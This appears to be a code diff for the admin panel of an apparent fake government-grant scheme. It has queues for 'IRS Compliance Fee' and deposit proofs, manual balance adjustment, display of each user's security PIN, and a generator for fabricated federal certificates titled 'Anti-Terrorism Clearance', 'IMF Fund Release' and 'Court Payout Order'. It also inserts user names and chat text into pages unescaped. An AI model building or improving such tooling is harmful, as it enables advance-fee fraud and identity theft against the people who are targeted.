@@ -45,7 +45,9 @@
         </div>
     </header>
 
-    <div class="p-4"><input type="text" id="main-search" placeholder="Search by name, email, or status..." class="w-full h-12 bg-slate-800/50 border border-slate-700 rounded-2xl px-5 text-xs text-white outline-none focus:border-sky-500 transition-all"></div>
+    <div class="p-4">
+        <input type="text" id="main-search" placeholder="Search citizens..." class="w-full h-12 bg-slate-800/50 border border-slate-700 rounded-2xl px-5 text-xs text-white outline-none focus:border-sky-500 transition-all">
+    </div>
 
     <main class="px-4 space-y-4">
         <div id="pane-users" class="pane active space-y-3"></div>
@@ -59,7 +61,7 @@
         </div>
 
         <div id="pane-history" class="pane space-y-3">
-            <h3 class="text-[10px] font-black text-slate-500 uppercase italic px-1 mb-2 text-amber-500">Action History (Undo)</h3>
+            <h3 class="text-[10px] font-black text-amber-500 uppercase italic px-1 mb-2">Processed (Undo/Revert)</h3>
             <div id="history-list" class="space-y-3"></div>
         </div>
 
@@ -124,7 +126,7 @@
         </div>
 
         <div id="pane-ledger" class="pane space-y-1">
-            <h3 class="text-[10px] font-black text-slate-500 uppercase italic px-1 mb-2">Global System Logs</h3>
+            <h3 class="text-[10px] font-black text-slate-500 uppercase italic px-1 mb-2">System Logs</h3>
             <div id="full-logs" class="space-y-1"></div>
         </div>
     </main>
@@ -159,14 +161,14 @@
                     <i class="fas fa-camera"></i>
                     <input type="file" id="msg-img" class="hidden" onchange="preImg(this)">
                 </label>
-                <input type="text" id="msg-in" class="flex-1 bg-slate-800 h-12 rounded-2xl px-5 text-white text-sm outline-none border border-slate-700" placeholder="Type secret message...">
+                <input type="text" id="msg-in" class="flex-1 bg-slate-800 h-12 rounded-2xl px-5 text-white text-sm outline-none border border-slate-700" placeholder="Type message...">
                 <button id="send-btn" class="w-14 h-12 bg-sky-600 rounded-2xl text-white"><i class="fas fa-paper-plane"></i></button>
             </div>
         </div>
     </div>
 
     <div id="viewer" class="fixed inset-0 bg-black/98 z-[20000] hidden flex flex-col items-center justify-center p-4" onclick="this.style.display='none'">
-        <img id="viewer-src" class="max-w-full max-h-[80%] rounded" alt="Large view">
+        <img id="viewer-src" class="max-w-full max-h-[80%] rounded" alt="View">
     </div>
 </div>
 
@@ -181,21 +183,17 @@
     onAuthStateChanged(auth, u => { if(u && u.email === ADMIN) sync(); else window.location.href="login.html"; });
 
     async function logActivity(targetName, action) {
-        await addDoc(collection(db, "logs"), {
-            targetUser: targetName,
-            action: action,
-            timestamp: new Date().toISOString()
-        });
+        await addDoc(collection(db, "logs"), { targetUser: targetName, action: action, timestamp: new Date().toISOString() });
     }
 
-    // NEW REVERT LOGIC
     window.revertTask = async (uid, type, currentStatus, amt) => {
-        if(!confirm(`Are you sure you want to set this ${type.toUpperCase()} back to PENDING?`)) return;
+        if(!confirm(`REVERT this ${type.toUpperCase()} to PENDING?`)) return;
         const ref = doc(db, "users", uid);
         const updateData = {};
         updateData[`${type}Status`] = 'PENDING';
         
-        if (currentStatus === 'SUCCESSFUL' && (type === 'apply' || type === 'deposit')) {
+        // Correct Balance Logic on Revert
+        if ((currentStatus === 'SUCCESSFUL' || currentStatus === 'APPROVED') && (type === 'apply' || type === 'deposit')) {
             updateData.balance = increment(-Number(amt));
         }
         if (currentStatus === 'FAILED' && type === 'withdraw') {
@@ -204,8 +202,8 @@
 
         try {
             await updateDoc(ref, updateData);
-            await logActivity("System", `REVERTED ${type.toUpperCase()} to PENDING`);
-            alert("Action Reverted!");
+            await logActivity("System", `REVERTED ${type.toUpperCase()} FOR ${uid}`);
+            alert("Action Reverted to Pending!");
         } catch (e) { alert(e.message); }
     };
 
@@ -221,19 +219,10 @@
                     const data = { id: d.id, ...d.data() }; 
                     users.push(data);
                     
-                    const needsAction = 
-                        ['PENDING','UNDER_REVIEW'].includes(data.kycStatus) || 
-                        data.applyStatus === 'PENDING' || 
-                        data.awardStatus === 'PENDING' || 
-                        data.withdrawStatus === 'PENDING' || 
-                        data.depositStatus === 'PENDING' || 
-                        data.taxStatus === 'PENDING';
+                    const needsAction = ['PENDING','UNDER_REVIEW'].includes(data.kycStatus) || data.applyStatus === 'PENDING' || data.awardStatus === 'PENDING' || data.withdrawStatus === 'PENDING' || data.depositStatus === 'PENDING' || data.taxStatus === 'PENDING';
                     
                     if(needsAction) tC++;
-                    if(data.chatHistory?.length > 0) {
-                        const lastMsg = data.chatHistory[data.chatHistory.length - 1];
-                        if(lastMsg.sender === 'USER') mC++;
-                    }
+                    if(data.chatHistory?.length > 0 && data.chatHistory[data.chatHistory.length - 1].sender === 'USER') mC++;
                     forgeS.innerHTML += `<option value="${data.id}" ${currentForgeVal === data.id ? 'selected' : ''}>${data.fullName || 'Anonymous'}</option>`;
                 }
             });
@@ -250,10 +239,9 @@
             snap.forEach(l => {
                 const log = l.data();
                 const col = log.action.includes('SUCCESSFUL') || log.action.includes('APPROVED') ? 'text-emerald-400' : (log.action.includes('FAILED') || log.action.includes('DECLINED') ? 'text-rose-400' : 'text-sky-400');
-                grid.innerHTML += `
-                <div class="p-3 bg-slate-800/30 rounded-lg mb-1 flex justify-between items-center text-[8px] font-mono border border-white/5">
-                    <span class="truncate pr-4"><b class="text-white">${log.targetUser || 'System'}:</b> <span class="${col}">${log.action}</span></span>
-                    <span class="text-slate-600 flex-shrink-0">${new Date(log.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
+                grid.innerHTML += `<div class="p-2 bg-slate-800/30 rounded mb-1 flex justify-between items-center text-[8px] font-mono border border-white/5">
+                    <span class="truncate"><b class="text-white">${log.targetUser}:</b> <span class="${col}">${log.action}</span></span>
+                    <span class="text-slate-600 flex-shrink-0">${new Date(log.timestamp).toLocaleTimeString()}</span>
                 </div>`;
             });
         });
@@ -271,129 +259,97 @@
             const email = u.email || "No email";
             if(!name.toLowerCase().includes(q) && !email.toLowerCase().includes(q)) return;
 
-            // 1. User List Render
-            let paymentInfo = "";
-            if(u.withdrawStatus === 'PENDING') {
-               paymentInfo = `<div class="mt-3 p-3 bg-slate-900/60 rounded-xl border border-slate-700/30">
-                  <span class="text-[8px] font-black uppercase text-sky-400 tracking-wider">Withdrawal Request (${u.withdrawMethod || 'N/A'}):</span>
-                  <div class="text-[9px] text-slate-300 mt-1">Amount: <b class="text-white">$${Number(u.withdrawAmount || 0).toLocaleString()}</b></div>
-               </div>`;
-            }
-
             uDiv.innerHTML += `
-            <div class="glass p-4 border-l-4 ${u.kycStatus === 'SUCCESSFUL' ? 'border-emerald-500' : 'border-slate-700'} relative">
+            <div class="glass p-4 border-l-4 ${u.kycStatus === 'SUCCESSFUL' ? 'border-emerald-500' : 'border-slate-700'}">
                 <div class="flex justify-between items-start mb-4">
                     <div>
-                        <h4 class="font-black text-white text-[11px] uppercase tracking-tight">${name}</h4>
-                        <p class="text-[8px] text-slate-500 mt-0.5">${email}</p>
-                        <p class="text-[9px] font-bold text-sky-500 mt-2"><i class="fas fa-key mr-1"></i>PIN: ${u.securityPin || '----'}</p>
+                        <h4 class="font-black text-white text-[11px] uppercase">${name}</h4>
+                        <p class="text-[8px] text-slate-500">${email}</p>
+                        <p class="text-[9px] font-bold text-sky-500 mt-2">PIN: ${u.securityPin || '----'}</p>
                     </div>
                     <div class="text-right">
-                        <p class="text-[14px] font-black text-emerald-400 tracking-tighter">$${Number(u.balance || 0).toLocaleString()}</p>
-                        <p class="text-[8px] text-slate-500 uppercase font-black">Available Balance</p>
+                        <p class="text-[14px] font-black text-emerald-400">$${Number(u.balance || 0).toLocaleString()}</p>
+                        <p class="text-[8px] text-slate-500 uppercase font-black">Balance</p>
                     </div>
                 </div>
-                ${paymentInfo}
-                <div class="flex gap-2 mt-4">
-                    <button onclick="openChat('${u.id}','${name}')" class="flex-1 h-10 bg-sky-500/10 text-sky-400 rounded-xl text-[9px] font-black uppercase border border-sky-500/10">Message</button>
-                    <button onclick="fund('${u.id}')" class="w-14 h-10 bg-emerald-500/10 text-emerald-500 rounded-xl text-[9px] font-black border border-emerald-500/10">FUND</button>
-                    <button onclick="vToggle('${u.id}','${u.kycStatus}')" class="w-14 h-10 bg-slate-800 text-slate-300 rounded-xl text-[9px] font-black border border-slate-700">${u.kycStatus === 'SUCCESSFUL' ? 'REVOKE' : 'VERIFY'}</button>
-                    <button onclick="deleteUser('${u.id}','${name}')" class="w-10 h-10 bg-rose-500/10 text-rose-500 rounded-xl border border-rose-500/20"><i class="fas fa-trash-alt text-[10px]"></i></button>
+                <div class="flex gap-2">
+                    <button onclick="openChat('${u.id}','${name}')" class="flex-1 h-9 bg-sky-500/10 text-sky-400 rounded-lg text-[9px] font-black border border-sky-500/10">CHAT</button>
+                    <button onclick="fund('${u.id}')" class="w-14 h-9 bg-emerald-500/10 text-emerald-500 rounded-lg text-[9px] font-black border border-emerald-500/10">FUND</button>
+                    <button onclick="vToggle('${u.id}','${u.kycStatus}')" class="w-14 h-9 bg-slate-800 text-slate-300 rounded-lg text-[9px] font-black border border-slate-700">${u.kycStatus === 'SUCCESSFUL' ? 'REVOKE' : 'VERIFY'}</button>
                 </div>
             </div>`;
 
-            // 2. Pending Tasks
-            if(['PENDING','UNDER_REVIEW'].includes(u.kycStatus)) tDiv.innerHTML += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0);
-            if(u.applyStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Grant Request: $${u.requestedAmount}`, null, 'apply', u.requestedAmount);
-            if(u.depositStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount);
-            if(u.taxStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, 'IRS Compliance Fee', [u.taxImage], 'tax', 0);
-            if(u.withdrawStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Disbursement: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount);
-            if(u.awardStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, 'Award Claim Request', null, 'award', 0);
+            const check = (type, title, imgs, amt) => {
+                if(u[`${type}Status`] === 'PENDING' || (type === 'kyc' && u.kycStatus === 'UNDER_REVIEW')) 
+                    tDiv.innerHTML += task(u.id, name, title, imgs, type, amt);
+            };
+            check('kyc', 'ID Verification', [u.idFront, u.idBack], 0);
+            check('apply', `Grant Request: $${u.requestedAmount}`, null, u.requestedAmount);
+            check('deposit', `Deposit Proof: $${u.depositAmount}`, [u.depositProof], u.depositAmount);
+            check('tax', 'IRS Compliance Fee', [u.taxImage], 0);
+            check('withdraw', `Withdrawal: $${u.withdrawAmount}`, null, u.withdrawAmount);
+            check('award', 'Award Claim', null, 0);
 
-            // 3. NEW: History List (Processed actions)
             const types = ['kyc', 'apply', 'deposit', 'tax', 'withdraw', 'award'];
             types.forEach(type => {
                 const status = u[`${type}Status`];
                 if(['SUCCESSFUL', 'FAILED', 'APPROVED', 'REJECTED'].includes(status)) {
                     const amt = u[`${type}Amount`] || u.requestedAmount || u.withdrawAmount || 0;
                     hDiv.innerHTML += `
-                    <div class="glass p-4 border-l-4 ${status.includes('SUCCESS') || status === 'APPROVED' ? 'border-emerald-500' : 'border-rose-500'}">
-                        <div class="flex justify-between items-center">
-                            <div>
-                                <h4 class="text-[10px] font-black text-white uppercase">${name}</h4>
-                                <p class="text-[9px] text-slate-400">${type.toUpperCase()}: <span class="font-bold">${status}</span></p>
-                            </div>
-                            <button onclick="revertTask('${u.id}', '${type}', '${status}', ${amt})" class="h-8 px-4 bg-amber-500/20 text-amber-500 rounded-lg text-[9px] font-black border border-amber-500/20">SET PENDING</button>
+                    <div class="glass p-3 border-l-2 ${status.includes('SUCCESS') || status === 'APPROVED' ? 'border-emerald-500' : 'border-rose-500'} flex justify-between items-center">
+                        <div>
+                            <p class="text-[9px] font-black text-white uppercase">${name}</p>
+                            <p class="text-[8px] text-slate-500">${type.toUpperCase()}: ${status}</p>
                         </div>
+                        <button onclick="revertTask('${u.id}', '${type}', '${status}', ${amt})" class="h-7 px-3 bg-amber-500/10 text-amber-500 rounded text-[8px] font-black border border-amber-500/10">REVERT</button>
                     </div>`;
                 }
             });
 
-            // 4. Chat List
             if(u.chatHistory?.length) {
                 const last = u.chatHistory[u.chatHistory.length-1];
-                const unread = last.sender === 'USER';
-                cDiv.innerHTML += `
-                <div onclick="openChat('${u.id}','${name}')" class="glass p-4 flex justify-between items-center ${unread ? 'border-r-4 border-sky-500 bg-sky-500/5' : ''}">
+                cDiv.innerHTML += `<div onclick="openChat('${u.id}','${name}')" class="glass p-4 flex justify-between items-center ${last.sender === 'USER' ? 'border-r-4 border-sky-500' : ''}">
                     <div class="flex items-center gap-3">
-                        <div class="w-10 h-10 rounded-full bg-slate-800 flex items-center justify-center font-black text-sky-500">${name.charAt(0)}</div>
-                        <div>
-                            <h4 class="font-black text-[10px] uppercase text-white">${name}</h4>
-                            <p class="text-[9px] text-slate-500 truncate w-44">${last.text || '📷 Sent an image'}</p>
-                        </div>
+                        <div class="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center font-black text-sky-500">${name.charAt(0)}</div>
+                        <p class="font-black text-[10px] text-white uppercase truncate w-32">${name}</p>
                     </div>
-                    <div class="flex flex-col items-end gap-1">
-                         ${unread ? '<span class="w-2 h-2 bg-sky-500 rounded-full animate-ping"></span>' : ''}
-                         <span class="text-[7px] text-slate-600">${new Date(last.time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
-                    </div>
+                    <span class="text-[7px] text-slate-600">${new Date(last.time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>
                 </div>`;
             }
         });
     }
 
-    // ... (rest of your existing functions: processTask, fund, deleteUser, vToggle, previewIRS, downloadIRS, task, openChat)
     window.processTask = async (uid, type, status, amt) => {
-        let note = status === 'FAILED' ? prompt("REJECTION REASON:", "Documentation inconsistent with federal records.") : "";
+        let note = status === 'FAILED' ? prompt("REJECTION REASON:", "Documentation inconsistent.") : "";
         if(status === 'FAILED' && note === null) return;
-        const userRef = doc(db, "users", uid);
-        const userDoc = await getDoc(userRef);
-        const userData = userDoc.data();
+        const ref = doc(db, "users", uid);
         const updateData = {};
         updateData[`${type}Status`] = status;
         if(note) updateData[`${type}Note`] = note;
         if(status === 'SUCCESSFUL') {
             if(type === 'apply' || type === 'deposit') updateData.balance = increment(Number(amt));
             if(type === 'withdraw') updateData.withdrawStatus = 'APPROVED';
-        } else if (status === 'FAILED') {
-            if(type === 'withdraw') {
-                updateData.balance = increment(Number(amt)); // Refund
-                updateData.withdrawStatus = 'REJECTED';
-            }
+        } else if (status === 'FAILED' && type === 'withdraw') {
+            updateData.balance = increment(Number(amt)); // Refund on withdrawal failure
+            updateData.withdrawStatus = 'REJECTED';
         }
-        const ledgerEntry = { id: "TX-" + Date.now(), type: type.toUpperCase(), amount: Number(amt) || 0, status: status, date: new Date().toLocaleDateString(), reason: note || "" };
-        updateData.ledger = arrayUnion(ledgerEntry);
         try {
-            await updateDoc(userRef, updateData);
-            await logActivity(userData.fullName, `${status}: ${type.toUpperCase()} ($${amt})`);
-            alert(`${type.toUpperCase()} Processed!`);
+            await updateDoc(ref, updateData);
+            await logActivity(uid, `${status}: ${type.toUpperCase()}`);
+            alert("Success!");
         } catch (e) { alert(e.message); }
     };
 
     window.fund = async (uid) => {
-        const v = prompt("Enter amount to adjust:");
+        const v = prompt("Enter amount (positive to add, negative to subtract):");
         if(v && !isNaN(v)) {
-            const userRef = doc(db, "users", uid);
-            const userDoc = await getDoc(userRef);
-            await updateDoc(userRef, { balance: increment(Number(v)), ledger: arrayUnion({ id: "ADJ-"+Date.now(), type: "ADJUSTMENT", amount: Math.abs(v), status: "SUCCESSFUL", date: new Date().toLocaleDateString(), reason: "Admin Adjustment" }) });
-            await logActivity(userDoc.data().fullName, `Fund Adj: $${v}`);
+            await updateDoc(doc(db, "users", uid), { balance: increment(Number(v)) });
+            await logActivity(uid, `Balance Adj: ${v}`);
         }
     };
 
-    window.deleteUser = async (uid, name) => { if(confirm(`DELETE ${name}?`)) { await deleteDoc(doc(db, "users", uid)); await logActivity(name, "DELETED"); } };
-
-    window.vToggle = async (uid, current) => {
-        const status = current === 'SUCCESSFUL' ? 'FAILED' : 'SUCCESSFUL';
-        await updateDoc(doc(db, "users", uid), { kycStatus: status });
+    window.vToggle = async (uid, cur) => {
+        await updateDoc(doc(db, "users", uid), { kycStatus: cur === 'SUCCESSFUL' ? 'FAILED' : 'SUCCESSFUL' });
     };
 
     window.previewIRS = () => {
@@ -403,11 +359,11 @@
         if(!uid || !amt) return;
         const u = users.find(x => x.id === uid);
         document.getElementById('irs-c-id').innerText = "FED-" + Math.floor(Math.random()*900000);
-        document.getElementById('irs-c-date').innerText = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+        document.getElementById('irs-c-date').innerText = new Date().toLocaleDateString('en-US', { month:'long', day:'numeric', year:'numeric' });
         document.getElementById('irs-c-name').innerText = u.fullName;
         document.getElementById('irs-c-email').innerText = u.email;
         document.getElementById('irs-c-val').innerText = Number(amt).toLocaleString();
-        const map = { TAX_CLEARANCE: "Tax Clearance (1099-G)", ANTI_TERROR: "Anti-Terrorism Clearance", IMF_RELEASE: "IMF Fund Release", COURT_ORDER: "Court Payout Order" };
+        const map = { TAX_CLEARANCE:"Tax Clearance (1099-G)", ANTI_TERROR:"Anti-Terrorism Clearance", IMF_RELEASE:"IMF Fund Release", COURT_ORDER:"Court Payout Order" };
         document.getElementById('irs-c-title').innerText = map[type].toUpperCase();
         document.getElementById('irs-c-reason').innerText = map[type].toLowerCase();
         document.getElementById('irs-preview-wrap').classList.remove('hidden');
@@ -423,14 +379,14 @@
     };
 
     function task(uid, name, title, imgs, type, amt) {
-        let gallery = imgs ? `<div class="flex gap-2 my-3">` + imgs.map(i => i ? `<img src="${i}" class="w-16 h-16 object-cover rounded-xl" onclick="pop('${i}')">` : '').join('') + `</div>` : '';
-        return `<div class="glass p-5 border-l-4 border-amber-500">
-            <h4 class="font-black text-white text-[11px] uppercase">${name}</h4>
-            <p class="text-[10px] text-amber-500 font-black uppercase italic">${title}</p>
+        let gallery = imgs ? `<div class="flex gap-2 my-3">` + imgs.map(i => i ? `<img src="${i}" class="w-12 h-12 object-cover rounded-lg" onclick="pop('${i}')">` : '').join('') + `</div>` : '';
+        return `<div class="glass p-4 border-l-4 border-amber-500">
+            <h4 class="font-black text-white text-[10px] uppercase">${name}</h4>
+            <p class="text-[9px] text-amber-500 font-black uppercase italic">${title}</p>
             ${gallery}
-            <div class="flex gap-3 mt-5">
-                <button onclick="processTask('${uid}','${type}','SUCCESSFUL', ${amt})" class="flex-1 bg-emerald-600 h-11 rounded-xl font-black text-[10px]">APPROVE</button>
-                <button onclick="processTask('${uid}','${type}','FAILED', ${amt})" class="flex-1 bg-rose-600/20 text-rose-500 h-11 rounded-xl font-black text-[10px]">DECLINE</button>
+            <div class="flex gap-2 mt-4">
+                <button onclick="processTask('${uid}','${type}','SUCCESSFUL', ${amt})" class="flex-1 bg-emerald-600 h-10 rounded-lg font-black text-[9px]">APPROVE</button>
+                <button onclick="processTask('${uid}','${type}','FAILED', ${amt})" class="flex-1 bg-rose-600/20 text-rose-500 h-10 rounded-lg font-black text-[9px]">DECLINE</button>
             </div>
         </div>`;
     }
@@ -440,9 +396,9 @@
         onSnapshot(doc(db, "users", uid), s => {
             const h = s.data().chatHistory || [];
             document.getElementById('chat-msgs').innerHTML = h.map(m => `
-                <div class="p-4 rounded-3xl max-w-[85%] ${m.sender === 'ADMIN' ? 'bg-sky-600 self-end rounded-br-none' : 'bg-slate-800 self-start rounded-bl-none'}">
-                    ${m.image ? `<img src="${m.image}" class="w-full rounded-2xl mb-2" onclick="pop('${m.image}')">` : ''}
-                    <p class="text-white text-[13px]">${m.text || ''}</p>
+                <div class="p-3 rounded-2xl max-w-[85%] ${m.sender === 'ADMIN' ? 'bg-sky-600 self-end rounded-br-none' : 'bg-slate-800 self-start rounded-bl-none'}">
+                    ${m.image ? `<img src="${m.image}" class="w-full rounded-lg mb-2" onclick="pop('${m.image}')">` : ''}
+                    <p class="text-white text-[12px]">${m.text || ''}</p>
                 </div>`).join('');
             const sc = document.getElementById('chat-msgs'); sc.scrollTop = sc.scrollHeight;
         });
